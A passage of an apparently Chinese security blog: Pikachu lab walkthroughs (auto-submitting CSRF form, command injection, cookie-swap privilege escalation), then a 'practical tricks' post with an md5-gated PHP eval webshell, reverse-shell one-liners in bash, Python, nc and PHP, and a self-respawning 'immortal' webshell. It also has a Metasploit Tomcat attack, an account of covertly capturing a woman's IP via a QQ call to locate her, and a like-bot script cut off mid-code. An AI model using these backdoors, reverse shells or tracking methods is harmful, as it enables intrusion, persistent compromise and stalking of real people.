<h3 id="CSRF-post"><a href="#CSRF-post" class="headerlink" title="CSRF(post)"></a>CSRF(post)</h3><p>和上面一样, 先登录进lili的账号, 看看是修改个人数据的数据包是长什么样子的.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">POST /pikachu/vul/csrf/csrfpost/csrf_post_edit.php HTTP/1.1</span><br><span class="line">Host: ipadd</span><br><span class="line">Content-Length: 71</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Origin: http://ipadd:999</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3</span><br><span class="line">Referer: http://ipadd/pikachu/vul/csrf/csrfpost/csrf_post_edit.php</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: wp-settings-time-1=1557833844; wp-settings-1=mfold%3Do; PHPSESSID=gaumm4piiptr5mtnjtsrp3hes6</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">sex=girl&amp;phonenum=138&amp;add=tianjin&amp;email=2222222%40tju.com&amp;submit=submit</span><br><span class="line">``` </span><br><span class="line">这种需要提交payload表单的环节, 需要我们自己的站点作为跳板, 类似前面的xss_post.</span><br><span class="line"></span><br><span class="line">写一个自动提交表单的页面出来.</span><br><span class="line">```html</span><br><span class="line">&lt;html&gt;  </span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">        &lt;form method=&quot;post&quot; action=&quot;http://ipadd/pikachu/vul/csrf/csrfpost/csrf_post_edit.php&quot;&gt;</span><br><span class="line"></span><br><span class="line">                &lt;input id=&quot;mycsrf1&quot; type= &quot;text&quot; maxlength=&quot;20&quot; name=&quot;sex&quot; value=&quot;girl&quot; /&gt;</span><br><span class="line">                &lt;input id=&quot;mycsrf2&quot; type= &quot;text&quot; maxlength=&quot;20&quot; name=&quot;phonenum&quot; value=&quot;138&quot; /&gt;</span><br><span class="line">                &lt;input id=&quot;mycsrf3&quot; type= &quot;text&quot; maxlength=&quot;20&quot; name=&quot;email&quot; value=&quot;22222@qq.com&quot; /&gt;</span><br><span class="line">                &lt;input id=&quot;postsubmit&quot; type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;submit&quot; /&gt;</span><br><span class="line">        &lt;/form&gt;</span><br><span class="line">        &lt;script&gt; </span><br><span class="line">                document.getElementById(&quot;postsubmit&quot;).click();</span><br><span class="line">        &lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p><del>好麻烦啊</del></p>
<p>测试一下, 成功了.</p>
<h2 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h2><p>这两个都很简单, 一带而过咯. </p>
<h3 id="exec-“ping”"><a href="#exec-“ping”" class="headerlink" title="exec “ping”"></a>exec “ping”</h3><p>远程执行ping命令.</p>
<p>可以使用<code>|</code>(管道)来执行多条命令. </p>
<p>比如 <code>ping localhost | ls</code>, 会发现把当前目录的文件列表打印了出来.</p>
<h3 id="exec-“eval”"><a href="#exec-“eval”" class="headerlink" title="exec “eval”"></a>exec “eval”</h3><p>如果学过了<code>php一句话木马</code>, 对<code>eval()</code>这个函数都不会陌生.</p>
<p><code>system(&#39;ls&#39;);</code></p>
<h2 id="Over-Permission"><a href="#Over-Permission" class="headerlink" title="Over Permission"></a>Over Permission</h2><h3 id="op1-member"><a href="#op1-member" class="headerlink" title="op1 member"></a>op1 member</h3><p>随便登录一个账号后, 点击查看个人信息.</p>
<p>发现被查询的用户是写进URL里的.</p>
<p>修改URL的参数为想要查询的账号即可越权查询.</p>
<h3 id="op2-login"><a href="#op2-login" class="headerlink" title="op2 login"></a>op2 login</h3><p>有两个管理员账号. 分别是普通管理(pikachu)和超级管理(admin)</p>
<p>先使用<code>burp suite</code>抓取admin的cookie.</p>
<p>在登录pikachu后, 尝试超级操作(如添加账号). 并讲数据包中的cookie换成admin的cookie. </p>
<p>发现操作成功了.</p>
<h2 id="File-Inclusion"><a href="#File-Inclusion" class="headerlink" title="File Inclusion"></a>File Inclusion</h2><h3 id="File-Inclusion-local"><a href="#File-Inclusion-local" class="headerlink" title="File Inclusion(local)"></a>File Inclusion(local)</h3><p>在URL中filename参数为要包含的文件.</p>
<p>可以实现任意文件读取. </p>
<h2 id="URL-重定向"><a href="#URL-重定向" class="headerlink" title="URL 重定向"></a>URL 重定向</h2><p>可以看到URL后面接了一个url参数.</p>
<p>修改这个参数即可跳转到我们指定的页面.例如</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ipadd/pikachu/vul/urlredirect/urlredirect.php?url=https://tjuyjn.top</span><br></pre></td></tr></table></figure>

]]></content>
      
        
        <tags>
            
            <tag> 文件包含漏洞 </tag>
            
            <tag> sql注入 </tag>
            
            <tag> xss </tag>
            
            <tag> PHP反序列化漏洞 </tag>
            
            <tag> csrf </tag>
            
            <tag> RCE </tag>
            
            <tag> 越权 </tag>
            
            <tag> URL重定向 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[实战中可能会用到的几个技巧]]></title>
      <url>/2019/07/29/%E5%AE%9E%E6%88%98%E4%B8%AD%E5%8F%AF%E8%83%BD%E4%BC%9A%E7%94%A8%E5%88%B0%E7%9A%84%E6%8A%80%E5%B7%A7/</url>
      <content type="html"><![CDATA[<h1 id="实战中可能会用到的几个技巧"><a href="#实战中可能会用到的几个技巧" class="headerlink" title="实战中可能会用到的几个技巧"></a>实战中可能会用到的几个技巧</h1><a id="more"></a>
<p>还有半个多月蓝帽杯就要开始了, 真的瑟瑟发抖. 估计要被虐菜.<br>唉, 实在不行就当北京一日游了QAQ.</p>
<h2 id="md5-加密一句话木马"><a href="#md5-加密一句话木马" class="headerlink" title="md5 加密一句话木马"></a>md5 加密一句话木马</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 密码: a='youjianing' &amp; b</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(md5($_GET[<span class="string">'a'</span>]) == <span class="string">'a4e8129c8cf66411c82c9a02fa08d223'</span>)&#123;</span><br><span class="line">    @<span class="keyword">eval</span>($_POST[<span class="string">'b'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>通过一层md5加密, 使得木马的安全性大大提高.<br>值得注意的是实战中需要找到足够安全的MD5密文.<br>顺便在这几次试验中确认, index是否被<code>&#39; &#39; 或 &quot; &quot;</code>包裹无影响. (没有系统学过PHP伤不起, 一到这种细节的地方就容易犯嘀咕) </p>
<h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><h3 id="出处"><a href="#出处" class="headerlink" title="出处"></a>出处</h3><p>本来是想好好整理出自己的文章的, 但是<a href="https://www.jianshu.com/p/6aca9b29514d" target="_blank" rel="noopener">这篇博客</a>我觉得已经把基本的方法罗列的很清楚, 写的足够好了. </p>
<h3 id="linux命令反弹shell"><a href="#linux命令反弹shell" class="headerlink" title="linux命令反弹shell"></a>linux命令反弹shell</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</span><br></pre></td></tr></table></figure>

<h3 id="python反弹shell"><a href="#python反弹shell" class="headerlink" title="python反弹shell"></a>python反弹shell</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c "import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('ip',port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);"</span><br></pre></td></tr></table></figure>

<h3 id="nc反弹shell"><a href="#nc反弹shell" class="headerlink" title="nc反弹shell"></a>nc反弹shell</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -e /bin/bash 192.168.1.146 7777</span><br></pre></td></tr></table></figure>

<h3 id="php反弹shell"><a href="#php反弹shell" class="headerlink" title="php反弹shell"></a>php反弹shell</h3><h4 id="php的exec函数反弹"><a href="#php的exec函数反弹" class="headerlink" title="php的exec函数反弹"></a>php的<code>exec函数</code>反弹</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r 'exec("/bin/bash -i &gt;&amp; /dev/tcp/192.168.1.146/7777");'</span><br></pre></td></tr></table></figure>

<h4 id="php的fsockopen远程连接"><a href="#php的fsockopen远程连接" class="headerlink" title="php的fsockopen远程连接"></a>php的<code>fsockopen</code>远程连接</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r '$sock=fsockopen("ip",port);exec("/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span><br></pre></td></tr></table></figure>

<h2 id="不死马"><a href="#不死马" class="headerlink" title="不死马"></a>不死马</h2><h3 id="制作不死马"><a href="#制作不死马" class="headerlink" title="制作不死马"></a>制作不死马</h3><p>在awd中, 经过混淆的一句话木马虽然能提供可使用的shell, 但是容易被服务器管理者发现并删除, 这不利于权限的维持.<br>不死马(也叫内存马), 一旦在目标主机中运行就无法通过一般的方法删除, 这对我们持续持有权限是极有帮助的.</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 摘自 https://www.jianshu.com/p/3cd8cc491b54</span></span><br><span class="line"><span class="comment"># ?pass=pass&amp;</span></span><br><span class="line"><span class="comment"># 密码 ?pass=pass &amp; a</span></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ignore_user_abort(<span class="keyword">true</span>);</span><br><span class="line">set_time_limit(<span class="number">0</span>);</span><br><span class="line">unlink(<span class="keyword">__FILE__</span>);</span><br><span class="line">$file = <span class="string">'2.php'</span>;</span><br><span class="line">$code = <span class="string">'&lt;?php if(md5($_GET["pass"])=="1a1dc91c907325c69271ddf0c944bc72")&#123;@eval($_POST[a]);&#125; ?&gt;'</span>;</span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>)&#123;</span><br><span class="line">    file_put_contents($file,$code);</span><br><span class="line">    usleep(<span class="number">5000</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><code>ignore_user_abort($setting)</code>:<br>  函数设置与客户机断开是否会终止脚本的执行.<br>  setting: 可选。如果设置为 true，则忽略与用户的断开，如果设置为 false，(与用户的断开)会导致脚本停止运行。如果未设置该参数，会返回当前的设置。</li>
<li><code>set_time_limit($time)</code>:<br>  设置脚本的最大运行时间, 如果$time=0, 则不限制时间.</li>
<li><code>unlink($file)</code>:<br>  删除文件. <code>$file=__FILE__</code>, 则删除脚本自身.</li>
<li><code>file_put_contents($file,$code)</code>:<br>  将字符串<code>$code</code>写入文件<code>$file</code>中.</li>
<li><code>usleep($time)</code>:<br>  暂停<code>$time</code>(毫秒), 与<code>sleep($time)</code>唯一的区别为单位, sleep()为秒.</li>
</ul>
<p>此处code写入的是上文提到的加密过的一句话木马, 可以根据需要自行修改.</p>
<p>目前脚本在Windows下, 使用<code>VScode</code>的<code>run code</code>可以成功运行并实现”不死”, 也可以通过web服务, 使用浏览器访问使之运行.<br>不过在linux下, 包括Ubuntu和kali系统, 我都无法通过浏览器访问的方式让脚本运行, 只能用命令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php ./不死马.php</span><br></pre></td></tr></table></figure>

<p>来运行 <del>, 这一点还不知道为什么.</del><br><del>希望dalao们能指点迷津.</del></p>
<p>嗯, 在<a href="https://www.tjuscswyz.cn/" target="_blank" rel="noopener">p4ssw0rd</a>学长的鼎力支持下, 我基本搞明白怎么回事了.<br><strong>再次感谢学长</strong></p>
<h3 id="上述异常的原因和解决办法"><a href="#上述异常的原因和解决办法" class="headerlink" title="上述异常的原因和解决办法"></a>上述异常的原因和解决办法</h3><p>我们在<code>linux</code>(包括<code>ubuntu</code>和<code>kali</code>)下没办法用浏览器连接启动的原因, 其实是权限问题.<br>当我把不死马(<code>buisma.php</code>)放在web目录下然后访问, 浏览器会表示正在加载, 可是回过头来看.</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unlink(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>

<p>如果正常运行的话, 不死马文件本身是要被删除的. 可是<code>busima.php</code>既没有被删除, 也没有创建<code>2.php</code>这个文件.<br>其实问题就出在这里. 我们知道<code>linux</code>的每个文件和目录都有权限控制. 如果用<code>ls -al</code>查看某个目录或者文件, 最前面会显示出权限控制信息, 通常为类似下面这段代码.</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">drwxrwxr-x 2 ubuntu ubuntu     4096  Jul  30  20:09 test</span><br></pre></td></tr></table></figure>

<p>这是什么意思呢?</p>
<blockquote>
<p>首先d表示这个文件是一个文件夹，然后文件的权限一共有9个字符表示，分成三组，分别表示文件所属用户的权限，文件所属用户组的权限，其他人的权限，r 表示读权限, w表示写权限， x表示执行权限.<br>From : <a href="https://zhidao.baidu.com/question/294587410.html" target="_blank" rel="noopener">https://zhidao.baidu.com/question/294587410.html</a></p>
</blockquote>
<p>按照我们的例子就是: </p>
<ul>
<li><code>test</code>是一个目录</li>
<li>所属用户拥有读写执行, 所属用户组拥有读写执行权限, 其它用户拥有读执行权限, 没有写入权限.</li>
<li>所属用户为ubuntu, 所属用户组为ubuntu</li>
</ul>
<p>如果我们使用web服务来使其运行, 那么就是以www-data用户执行, 它属于其它用户, 没有写入权限.<br>而之前提到的删除正需要写入权限, 自然程序到这里就没法继续执行了.<br>事实是否如此, 我们可以验证下. </p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@VM-0-3-ubuntu:/var/www/html$ chmod test 777</span><br><span class="line">ubuntu@VM-0-3-ubuntu:/var/www/html$ ls -al "test"</span><br><span class="line">total 16</span><br><span class="line">drwxrwxrwx  2 ubuntu   ubuntu   4096 Jul 31 14:33 .</span><br><span class="line">(略)</span><br></pre></td></tr></table></figure>

<p>浏览器访问, 不死马直接运行, 没得毛病!</p>
<h3 id="杀死不死马"><a href="#杀死不死马" class="headerlink" title="杀死不死马"></a>杀死不死马</h3><p>因为不死马已经被写进内存中不断写<code>webshell</code>, 所以只删除<code>webshell</code>没有任何意义. 必须终止不死马的进程.<br>如果是拥有管理员权限的情况下, 直接关掉<code>apache2</code>服务是最直接的, 因为不死马是在它的子进程下.<br>不过比赛中一般都是低权限用户, 没法直接关闭<code>apache2</code>服务. 但也可以用下面的方法杀不死马.<br>用蚁剑或菜刀连上自己留的<code>webshell</code>(相当于登录<code>www-data</code>用户), 然后在终端输入命令</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">killall -u www-data</span><br></pre></td></tr></table></figure>

<p>kill 所有<code>www-data</code>用户下的进程(当然也包括<code>busima</code>). 很巧的是, 那些root的服务, 我们权限不够, kill 不了, 自然不会让服务挂掉.</p>
<h2 id="metasploit一次实战"><a href="#metasploit一次实战" class="headerlink" title="metasploit一次实战"></a>metasploit一次实战</h2><ol start="0">
<li><p>为什么要记录这次?<br>因为这次是我第一次比较正式的使用<code>metasploit</code>, 也真正的见识到了它的强大, 我相信这个工具将来还会扮演更重要的角色.<br>除此之外, 这个靶机位于国外, 需要科学上网, 所以如果将来想要复现还比较麻烦, 不如干脆详细的记录一下. 供将来的自己参照查看.</p>
</li>
<li><p>首先查看自己的ip和子网ip, 这是所有步骤的开始.</p>
<figure class="image-box">
                <img src="http://188.131.227.20:999/picture/ipconfig.png" alt title class>
                <p></p>
            </figure></li>
<li><p>获取了子网的ip地址后, 我们知道靶机就在这个子网中, 所以可以用Nmap扫出靶机的位置.</p>
<figure class="image-box">
                <img src="http://188.131.227.20:999/picture/nmapsubnet.png" alt title class>
                <p></p>
            </figure>
<p>靶机IP为<code>192.68.149.3</code></p>
</li>
<li><p>这个时候如果直接用浏览器访问是访问不到的. 因为我们还不知道它的http端口是多少(默认大多为80或8080). 我们还需要更详细的信息.</p>
<figure class="image-box">
                <img src="http://188.131.227.20:999/picture/nmapA.png" alt title class>
                <p></p>
            </figure></li>
<li><p>再次访问<code>192.68.149.3:8080</code>就能访问web服务了. 下面就用这次的主角<code>metasploit</code>针对<code>tomcat</code>的漏洞进行攻击.</p>
<figure class="image-box">
                <img src="http://188.131.227.20:999/picture/search.png" alt title class>
                <p></p>
            </figure></li>
<li><p>我们选用tomcat_mgr_login这个漏洞来尝试获得后台的账户和密码.</p>
<figure class="image-box">
                <img src="http://188.131.227.20:999/picture/use1.png" alt title class>
                <p></p>
            </figure></li>
<li><p>查看相关的参数</p>
<figure class="image-box">
                <img src="http://188.131.227.20:999/picture/options1.png" alt title class>
                <p></p>
            </figure></li>
<li><p>设置参数. 包括靶机的ip和端口, 使用的账户名和密码字典.</p>
<figure class="image-box">
                <img src="http://188.131.227.20:999/picture/set1.png" alt title class>
                <p></p>
            </figure></li>
<li><p>设置完成后就可以开始漏洞利用了.</p>
<figure class="image-box">
                <img src="http://188.131.227.20:999/picture/exploit11.png" alt title class>
                <p></p>
            </figure></li>
<li><p>成功爆破出了我们要的东西.</p>
<figure class="image-box">
                <img src="http://188.131.227.20:999/picture/exploit12.png" alt title class>
                <p></p>
            </figure></li>
<li><p>用浏览器尝试下能不能登陆后台.</p>
<figure class="image-box">
                <img src="http://188.131.227.20:999/picture/webbrowser1.png" alt title class>
                <p></p>
            </figure>
<figure class="image-box">
                <img src="http://188.131.227.20:999/picture/webbrowser2.png" alt title class>
                <p></p>
            </figure>
<p>没有问题!</p>
</li>
<li><p>下面再用第二个漏洞来获取shell.<br>这次我们用tomcat_mgr_upload, 并查看参数.</p>
<figure class="image-box">
                <img src="http://188.131.227.20:999/picture/useandset.png" alt title class>
                <p></p>
            </figure></li>
<li><p>设置好后就开始漏洞利用.</p>
<figure class="image-box">
                <img src="http://188.131.227.20:999/picture/exploit2.png" alt title class>
                <p></p>
            </figure></li>
<li><p>下面是成功后的效果.</p>
<figure class="image-box">
                <img src="http://188.131.227.20:999/picture/meterpreter.png" alt title class>
                <p></p>
            </figure>
<figure class="image-box">
                <img src="http://188.131.227.20:999/picture/operatarget.png" alt title class>
                <p></p>
            </figure>
<p>可以看到这里的<code>meterpreter</code>和真正的shell还是有所区别的.<br>值得注意的一点, 可以用下面的命令来使用python调出shell.</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c "import pty;pty.spawn('/bin/sh')"</span><br></pre></td></tr></table></figure>
</li>
<li><p>完.<br><del>头一次截了这么多图, 真鸡儿累.</del><br><del>抱歉, 图被无良七牛云吞了, 有生之年可能会找回来.</del><br><del>还好当时是用QQ截的图, 缓存在QQ里了, 哈哈哈</del></p>
<h2 id="用QQ获取女神的IP"><a href="#用QQ获取女神的IP" class="headerlink" title="用QQ获取女神的IP"></a>用QQ获取女神的IP</h2><p>某个寂寞的夜晚, 我又想起我的女神.<br>女神啊, 你现在在何方?<br>马上就能知道.<br>.<br>.<br>.<br>这边打开着<code>wireshark</code>, 开始抓包.<br>拿起手机, 打开女神的qq聊天框, 丢过去个qq电话.<br>大概过个几秒(时间把握好, 别让女神接了电话…哈哈哈).<br>回到<code>wireshark</code>这, 停止抓包.</p>
</li>
</ol>
<p>Ctrl+F, 设置为<strong>字符串</strong>和<strong>分组详情</strong>.<br>然后在框里输入<code>020048</code>, 就能找到女神的IP地址了<br>这串代码应该是QQ电话的请求的二进制码的一部分.</p>
<p>效果:</p>
<p><del>图没了 QAQ</del></p>
<p>于是我拿着女神的IP尝试着定位了一下, 感觉没什么异常, <font color="green">就安心了</font>.</p>
<p>完.<br>好吧, 这和实战没啥关系, 就是觉得好玩. 而且也很简单.</p>
<p><a href="https://blog.csdn.net/qq78069460/article/details/79153958" target="_blank" rel="noopener">详细过程</a></p>
<h2 id="感慨"><a href="#感慨" class="headerlink" title="感慨"></a>感慨</h2><p>接触网络安全越久, 发现自己的未知面就越广.<br>觉得自己要学的东西还有太多.<br><strong>不过我不想急于求成, 惟愿每天都有所收获.</strong></p>
]]></content>
      
        
        <tags>
            
            <tag> metasploit </tag>
            
            <tag> awd </tag>
            
            <tag> 不死马 </tag>
            
            <tag> 反弹shell </tag>
            
            <tag> linux权限控制 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[用python给女神刷赞会发生什么？]]></title>
      <url>/2019/07/19/%E5%BD%93%E4%BD%A0%E7%94%A8python%E7%BB%99%E5%A5%B3%E7%A5%9E%E5%88%B7%E8%B5%9E%E4%BC%9A%E5%8F%91%E7%94%9F%E4%BB%80%E4%B9%88/</url>
      <content type="html"><![CDATA[<h1 id="用python给女神刷赞会发生什么？"><a href="#用python给女神刷赞会发生什么？" class="headerlink" title="用python给女神刷赞会发生什么？"></a>用python给女神刷赞会发生什么？</h1><a id="more"></a>
<p><strong>会被博主发到博客里啦, 笨蛋.</strong></p>
<h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># code=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.chrome.options <span class="keyword">import</span> Options</span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver </span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">chrome_options = Options()</span><br><span class="line"><span class="comment"># 如果是无界面的浏览 </span></span><br><span class="line"><span class="comment"># chrome_options.add_argument('--headless')</span></span><br><span class="line">chrome = webdriver.Chrome(chrome_options=chrome_options)  <span class="comment">#浏览器驱动</span></span><br><span class="line"></span><br><span class="line">you_qq_number = <span class="number">1348651580</span>   <span class="comment"># 你的QQ号</span></span><br><span class="line">you_qq_password = <span class="string">"JXU2MjREJXU0RTBEJXU0RjFBJXU1NDRBJXU4QkM5JXU0RjYwJXU1QkM2JXU3ODAxJXU1NDYy"</span> <span class="comment">#你的密码</span></span><br><span class="line">friends_qq_number =  <span class="number">123</span>     <span class="comment"># 你想给点赞的好友的qq号</span></span><br><span class="line">number_of_like = <span class="number">0</span>           <span class="comment"># 记录点了多少赞</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 将find_element_by_xpath()方法封装, 作用是可以反复查找那些因为加载延迟而无法定位的元素, 避免因为这些情况导致程序崩溃</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">locate</span><span class="params">(xpath)</span>:</span>           </span><br><span class="line">    times = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:    </span><br><span class="line">            <span class="keyword">return</span> chrome.find_element_by_xpath(xpath)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            print(<span class="string">"第"</span>+str(times)+<span class="string">"次定位"</span>+xpath+<span class="string">"失败"</span>)</span><br><span class="line">            times = times + <span class="number">1</span></span><br><span class="line">            time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将视角锁定到这个元素上, 不然可能无法点击</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">view_to_element</span><span class="params">(element)</span>:</span></span><br><span class="line">    chrome.execute_script(<span class="string">"arguments[0].scrollIntoView();"</span>,element)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 模拟点赞</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">click_like</span><span class="params">(number)</span>:</span></span><br><span class="line">    xpath = <span class="string">"//*[@id='host_home_feeds']/li["</span>+str(number)+<span class="string">"]"</span></span><br><span class="line">    view_to_element(locate(xpath)) </span><br><span class="line">    <span class="keyword">if</span> number==<span class="number">1</span> <span class="keyword">and</span> locate(xpath+<span class="string">"/div[1]"</span>).get_attribute(<span class="string">"class"</span>) == <span class="string">'f-single-top'</span>:</span><br><span class="line">        <span class="comment"># 存在置顶说说时</span></span><br><span class="line">        xpath += <span class="string">"/div[4]/div[1]/p/a[3]"</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        xpath += <span class="string">"/div[3]/div[1]/p/a[3]"</span></span><br><span class="line">    <span class="keyword">if</span> locate(xpath).get_attribute(<span class="string">'data-clicklog'</span>) == <span class="string">"like"</span>:            </span><br><span class="line">        locate(xpath+<span class="string">"/i"</span>).click()</span><br><span class="line">        <span class="keyword">global</span> number_of_like</span><br><span class="line">        number_of_like += <span class="number">1</span></span><br><span class="line">        print(<span class="string">"the number of clicking like is : "</span>+str(number_of_like))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始化</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">initial</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment"># 开启页面</span></span><br><span class="line">    chrome.get(<span class="string">"https://user.qzone.qq.com/"</span>+str(you_qq_number) +<span class="string">"/main"</span>)</span><br><span class="line">    chrome.maximize_window()</span><br><span class="line">    chrome.implicitly_wait(<span class="number">30</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 帐号密码登陆</span></span><br><span class="line">    chrome.switch_to.frame(<span class="string">"login_frame"</span>)</span><br><span class="line">    chrome.find_element_by_link_text(<span class="string">"帐号密码登录"</span>).click()</span><br><span class="line"></span><br><span class="line">    